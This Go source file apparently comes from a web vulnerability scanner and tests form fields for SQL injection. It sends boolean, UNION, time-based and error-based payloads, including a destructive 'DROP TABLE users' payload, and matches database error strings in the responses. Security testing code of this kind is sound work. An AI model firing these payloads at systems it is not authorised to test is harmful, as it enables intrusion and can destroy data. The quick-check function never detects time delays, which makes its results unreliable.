package scanner

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// SQLiPayload representa um payload de teste SQL Injection
type SQLiPayload struct {
	Payload     string
	Description string
	Type        string // time-based, error-based, union-based, boolean-based
}

// Payloads avançados para detecção de SQL Injection
var sqliPayloads = []SQLiPayload{
	// Error-based
	{Payload: "' OR 1=1--", Description: "OR boolean básico", Type: "boolean"},
	{Payload: "' OR '1'='1", Description: "OR string boolean", Type: "boolean"},
	{Payload: "' UNION SELECT null--", Description: "UNION básico", Type: "union"},
	{Payload: "' UNION SELECT null,null,null--", Description: "UNION 3 colunas", Type: "union"},
	{Payload: "'; DROP TABLE users--", Description: "DROP TABLE", Type: "error"},
	{Payload: "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'", Description: "UNION com dados", Type: "union"},
	{Payload: "admin'--", Description: "Comentário simples", Type: "boolean"},
	{Payload: "' OR 'x'='x", Description: "OR alternativo", Type: "boolean"},
	{Payload: "') OR ('1'='1", Description: "OR com parênteses", Type: "boolean"},
	
	// Time-based
	{Payload: "' OR SLEEP(5)--", Description: "MySQL SLEEP", Type: "time"},
	{Payload: "'; WAITFOR DELAY '0:0:5'--", Description: "SQL Server WAITFOR", Type: "time"},
	{Payload: "' OR pg_sleep(5)--", Description: "PostgreSQL sleep", Type: "time"},
	
	// Stacked queries
	{Payload: "'; SELECT pg_sleep(5)--", Description: "Stacked query PostgreSQL", Type: "time"},
	{Payload: "1'; SELECT SLEEP(5)#", Description: "Stacked query MySQL", Type: "time"},
	
	// Error-based detailed
	{Payload: "' AND 1=CONVERT(int, (SELECT @@version))--", Description: "SQL Server version", Type: "error"},
	{Payload: "' AND extractvalue(1, concat(0x7e, version()))--", Description: "MySQL extractvalue", Type: "error"},
}

// Indicadores expandidos de SQL Injection
var sqliIndicators = []string{
	// Erros MySQL
	"you have an error in your sql syntax",
	"warning: mysql",
	"mysql_fetch",
	"mysql_num_rows",
	"mysql error",
	"supplied argument is not a valid mysql",
	
	// Erros PostgreSQL
	"pg_query",
	"pg_exec",
	"postgresql",
	"warning: pg",
	"pgsql",
	"unterminated quoted string",
	
	// Erros SQL Server
	"microsoft ole db provider for sql server",
	"sqlstate",
	"odbc sql server driver",
	"microsoft sql native client",
	"ora-",
	"sql server",
	
	// Erros Oracle
	"ora-01756",
	"ora-00933",
	"oracle error",
	
	// Erros SQLite
	"sqlite_",
	"sqlite error",
	"sqliteexception",
	
	// Erros genéricos
	"syntax error",
	"sql syntax",
	"database error",
	"query failed",
	"unexpected end of sql command",
	"quoted string not properly terminated",
}

// SQLiResult armazena o resultado de um teste SQLi
type SQLiResult struct {
	Vulnerable  bool
	Payload     string
	Description string
	Type        string
	Indicator   string
	Response    string
	Field       string
}

// TestSQLi testa vulnerabilidades SQL Injection em um formulário
func TestSQLi(form Form, baseURL string, client *http.Client) bool {
	for _, sqliPayload := range sqliPayloads {
		if testSingleSQLi(form, baseURL, client, sqliPayload.Payload) {
			return true
		}
		time.Sleep(50 * time.Millisecond) // Rate limiting
	}
	return false
}

// TestSQLiDetailed testa SQLi e retorna resultados detalhados
func TestSQLiDetailed(form Form, baseURL string, client *http.Client) []SQLiResult {
	var results []SQLiResult

	for _, sqliPayload := range sqliPayloads {
		for _, field := range form.Inputs {
			data := url.Values{}
			// Preenche outros campos com valores normais
			for _, input := range form.Inputs {
				if input == field {
					data.Set(input, sqliPayload.Payload)
				} else {
					data.Set(input, "test")
				}
			}

			target := baseURL + form.Action
			var res *http.Response
			var err error

			startTime := time.Now()
			if form.Method == "POST" {
				res, err = client.PostForm(target, data)
			} else {
				fullURL := target + "?" + data.Encode()
				res, err = client.Get(fullURL)
			}
			elapsed := time.Since(startTime)

			if err != nil {
				continue
			}

			buf := new(strings.Builder)
			io.Copy(buf, res.Body)
			body := buf.String()
			res.Body.Close()

			vulnerable, indicator := detectSQLi(body, sqliPayload.Type, elapsed)

			results = append(results, SQLiResult{
				Vulnerable:  vulnerable,
				Payload:     sqliPayload.Payload,
				Description: sqliPayload.Description,
				Type:        sqliPayload.Type,
				Indicator:   indicator,
				Response:    truncateString(body, 500),
				Field:       field,
			})

			if vulnerable {
				break // Vulnerável encontrado
			}

			time.Sleep(50 * time.Millisecond)
		}
	}

	return results
}

func testSingleSQLi(form Form, baseURL string, client *http.Client, payload string) bool {
	data := url.Values{}

	for _, input := range form.Inputs {
		data.Set(input, payload)
	}

	target := baseURL + form.Action
	var res *http.Response
	var err error

	startTime := time.Now()
	if form.Method == "POST" {
		res, err = client.PostForm(target, data)
	} else {
		fullURL := target + "?" + data.Encode()
		res, err = client.Get(fullURL)
	}
	elapsed := time.Since(startTime)

	if err != nil {
		return false
	}
	defer res.Body.Close()

	buf := new(strings.Builder)
	io.Copy(buf, res.Body)
	body := buf.String()

	vulnerable, _ := detectSQLi(body, "error", elapsed)
	return vulnerable
}

// detectSQLi verifica se há indicadores de SQL Injection
func detectSQLi(body, payloadType string, elapsed time.Duration) (bool, string) {
	bodyLower := strings.ToLower(body)

	// Time-based detection
	if payloadType == "time" && elapsed > 4*time.Second {
		return true, fmt.Sprintf("Time delay detected: %v", elapsed)
	}

	// Error-based detection
	for _, indicator := range sqliIndicators {
		if strings.Contains(bodyLower, indicator) {
			return true, indicator
		}
	}

	return false, ""
}

func truncateString(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen] + fmt.Sprintf("... (%d chars truncated)", len(s)-maxLen)
}
